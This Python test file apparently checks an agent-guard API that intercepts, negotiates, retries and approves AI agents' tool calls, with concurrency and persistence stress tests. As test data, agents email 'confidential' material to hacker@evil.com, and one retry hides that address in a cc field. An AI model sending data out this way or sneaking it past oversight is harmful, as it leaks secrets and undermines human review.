import asyncio

from fastapi.testclient import TestClient

from agentshield.api import server


def test_full_flow_intercept_negotiate_retry_approve() -> None:
    with TestClient(server.app) as client:
        if server._shield is not None:
            server._shield.audit_log.clear()
            server._shield.negotiator.negotiation_history.clear()
            server._request_counts_by_agent.clear()

        initial = client.post(
            "/api/v1/intercept",
            json={
                "tool_name": "send_email",
                "arguments": {"to": "hacker@evil.com", "subject": "confidential"},
                "agent_id": "flow-agent",
            },
        )
        assert initial.status_code == 200
        action_id = initial.json()["action_id"]

        negotiate = client.post(f"/api/v1/negotiate/{action_id}")
        assert negotiate.status_code == 200

        retry = client.post(
            f"/api/v1/retry/{action_id}",
            json={
                "modified_arguments": {
                    "to": "manager@yourcompany.com",
                    "cc": "hacker@evil.com",
                    "subject": "confidential",
                },
                "requested_by": "flow-agent",
            },
        )
        assert retry.status_code == 200

        approval = client.post(
            "/api/v1/request-approval",
            json={"action_id": action_id, "reason": "business need", "requested_by": "flow-agent"},
        )
        assert approval.status_code == 200
        approve = client.post(
            "/api/v1/approve",
            json={"action_id": action_id, "approved": True, "reason": "approved"},
        )
        assert approve.status_code == 200


def test_stress_100_concurrent_negotiations() -> None:
    async def _run() -> None:
        shield = server.get_shield()
        shield.audit_log.clear()
        shield.negotiator.negotiation_history.clear()
        tasks = []
        for i in range(100):
            tasks.append(
                shield.intercept_with_negotiation(
                    "send_email",
                    {"to": f"hacker{i}@evil.com", "subject": "confidential"},
                    agent_id=f"conc-{i}",
                )
            )
        await asyncio.gather(*tasks)
        assert len(shield.negotiator.negotiation_history) >= 100

    with TestClient(server.app):
        asyncio.run(_run())


def test_stress_1000_actions_db_persistence() -> None:
    with TestClient(server.app) as client:
        if server._shield is not None:
            server._shield.audit_log.clear()
            server._request_counts_by_agent.clear()

        for i in range(1000):
            response = client.post(
                "/api/v1/intercept",
                json={
                    "tool_name": "create_ticket" if i % 2 else "send_email",
                    "arguments": {"title": f"t-{i}", "to": "team@yourcompany.com"},
                    "agent_id": f"db-agent-{i % 50}",
                },
            )
            assert response.status_code == 200

        audit = client.get("/api/v1/audit", params={"limit": 1000})
        assert audit.status_code == 200
        assert len(audit.json()) == 1000
